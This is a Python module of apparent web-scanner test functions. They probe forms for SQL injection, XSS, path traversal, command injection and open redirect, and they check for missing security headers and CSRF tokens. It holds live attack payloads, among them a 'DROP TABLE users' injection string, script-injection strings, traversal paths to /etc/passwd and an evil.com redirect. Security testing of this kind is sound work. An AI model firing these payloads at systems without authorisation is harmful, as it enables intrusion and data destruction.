import requests
import uuid
from typing import List, Dict, Any
from urllib.parse import urljoin

def test_sqli(url: str, forms: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Tests forms for SQL Injection vulnerabilities by sending classic 
    SQLi payloads and checking the response for SQL error strings.
    """
    findings = []
    
    # Common payloads designed to break SQL syntax
    # 1. ' OR 1=1 --   -> classic authentication bypass
    # 2. ' OR 'a'='a   -> another auth bypass variant
    # 3. 1; DROP TABLE users -- -> stacked query testing intent
    payloads = [
        "' OR 1=1 --",
        "' OR 'a'='a",
        "1; DROP TABLE users --"
    ]
    
    # Indicators that a database engine threw an error
    error_keywords = [
        "sql syntax", 
        "mysql", 
        "ORA-", 
        "syntax error", 
        "unclosed quotation"
    ]
    
    for form in forms:
        action_url = urljoin(url, form.get("action", ""))
        
        for payload in payloads:
            for input_name in form.get("inputs", []):
                # We build a generic form payload, filling all inputs 
                # but substituting one input at a time with our attack payload.
                data = {name: "dummy_data" for name in form.get("inputs", [])}
                data[input_name] = payload
                
                try:
                    # We use simple POSTs here. True implementation might dynamically
                    # switch based on the form method, but POST covers most forms.
                    response = requests.post(action_url, data=data, timeout=10)
                    text_lower = response.text.lower()
                    
                    found_error = False
                    for keyword in error_keywords:
                        if keyword in text_lower:
                            found_error = True
                            break
                            
                    if found_error:
                        findings.append({
                            "url": action_url,
                            "input": input_name,
                            "payload": payload,
                            "vulnerable": True,
                            "type": "SQLi"
                        })
                        
                except requests.RequestException:
                    pass
                    
    return findings


def test_xss(url: str, forms: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Tests forms for Cross-Site Scripting (XSS) vulnerabilities by injecting
    JavaScript payloads and checking if they reflect unescaped in HTML.
    """
    findings = []
    
    # Payloads designed to trigger script execution
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "\"><svg onload=alert(1)>"
    ]
    
    for form in forms:
        action_url = urljoin(url, form.get("action", ""))
        
        for payload in payloads:
            for input_name in form.get("inputs", []):
                data = {name: "dummy_data" for name in form.get("inputs", [])}
                data[input_name] = payload
                
                try:
                    response = requests.post(action_url, data=data, timeout=10)
                    
                    # Unescaped means the browser will interpret the < and > 
                    # brackets as actual code instead of rendering them as text
                    # (which would be &lt; and &gt;). This is highly dangerous.
                    if payload in response.text:
                        findings.append({
                            "url": action_url,
                            "input": input_name,
                            "payload": payload,
                            "vulnerable": True,
                            "type": "XSS"
                        })
                        
                except requests.RequestException:
                    pass
                    
    return findings

def test_path_traversal(url: str, forms: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Tests forms for Path/Directory Traversal (LFI) by sending relative path payloads
    and searching the response for common UNIX/Windows file contents.
    """
    findings = []
    
    payloads = [
        "../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../windows/win.ini"
    ]
    
    # Common strings indicating a successful file read
    indicators = [
        "root:x:0:0",       # /etc/passwd
        "[extensions]",     # win.ini
        "fonts.dir"         # win.ini
    ]
    
    for form in forms:
        action_url = urljoin(url, form.get("action", ""))
        
        for payload in payloads:
            for input_name in form.get("inputs", []):
                data = {name: "dummy_data" for name in form.get("inputs", [])}
                data[input_name] = payload
                
                try:
                    response = requests.post(action_url, data=data, timeout=10)
                    
                    if any(indicator in response.text for indicator in indicators):
                        findings.append({
                            "url": action_url,
                            "input": input_name,
                            "payload": payload,
                            "vulnerable": True,
                            "type": "Path Traversal (LFI)"
                        })
                        
                except requests.RequestException:
                    pass
                    
    return findings

def test_command_injection(url: str, forms: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Tests forms for OS Command Injection by appending system commands.
    """
    findings = []
    
    # Payloads designed to execute harmless recon commands
    payloads = [
        "; echo 'VULN_CMD_EXEC'",
        "| echo 'VULN_CMD_EXEC'",
        "`echo 'VULN_CMD_EXEC'`"
    ]
    
    for form in forms:
        action_url = urljoin(url, form.get("action", ""))
        
        for payload in payloads:
            for input_name in form.get("inputs", []):
                data = {name: "dummy_data" for name in form.get("inputs", [])}
                data[input_name] = payload
                
                try:
                    response = requests.post(action_url, data=data, timeout=10)
                    
                    if "VULN_CMD_EXEC" in response.text:
                        findings.append({
                            "url": action_url,
                            "input": input_name,
                            "payload": payload,
                            "vulnerable": True,
                            "type": "Command Injection"
                        })
                        
                except requests.RequestException:
                    pass
                    
    return findings

def test_open_redirect(url: str, forms: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Tests forms for Open Redirect vulnerabilities by sending an external URL payload.
    """
    findings = []
    payloads = ["http://evil.com", "//evil.com"]
    
    for form in forms:
        action_url = urljoin(url, form.get("action", ""))
        for payload in payloads:
            for input_name in form.get("inputs", []):
                # Target inputs that typically handle redirects
                if "url" in input_name.lower() or "redirect" in input_name.lower() or "next" in input_name.lower():
                    data = {name: "dummy_data" for name in form.get("inputs", [])}
                    data[input_name] = payload
                    
                    try:
                        # Allow redirects to see if it lands on evil.com
                        response = requests.post(action_url, data=data, timeout=10, allow_redirects=True)
                        if response.url.startswith("http://evil.com"):
                            findings.append({
                                "url": action_url,
                                "input": input_name,
                                "payload": payload,
                                "vulnerable": True,
                                "type": "Open Redirect",
                                "severity": "Medium"
                            })
                    except requests.RequestException:
                        pass
    return findings

def test_security_headers(url: str, headers: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    Evaluates the presence of crucial security headers.
    """
    findings = []
    
    if not headers.get("Content-Security-Policy"):
        findings.append({
            "url": url,
            "input": "HTTP Header",
            "payload": "Missing CSP",
            "vulnerable": True,
            "type": "Missing Security Header: CSP",
            "severity": "Low"
        })
        
    if not headers.get("Strict-Transport-Security") and url.startswith("https"):
        findings.append({
            "url": url,
            "input": "HTTP Header",
            "payload": "Missing HSTS",
            "vulnerable": True,
            "type": "Missing Security Header: HSTS",
            "severity": "Medium"
        })
        
    if not headers.get("X-Frame-Options"):
        findings.append({
            "url": url,
            "input": "HTTP Header",
            "payload": "Missing X-Frame-Options",
            "vulnerable": True,
            "type": "Missing Security Header: Clickjacking",
            "severity": "Medium"
        })
        
    return findings

def test_csrf(url: str, forms: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Flags forms that are missing CSRF protection.
    """
    findings = []
    for form in forms:
        if not form.get("has_csrf_token"):
            findings.append({
                "url": urljoin(url, form.get("action", "")),
                "input": "HTML Form",
                "payload": "Missing Anti-CSRF Token",
                "vulnerable": True,
                "type": "Missing CSRF Protection",
                "severity": "High"
            })
    return findings
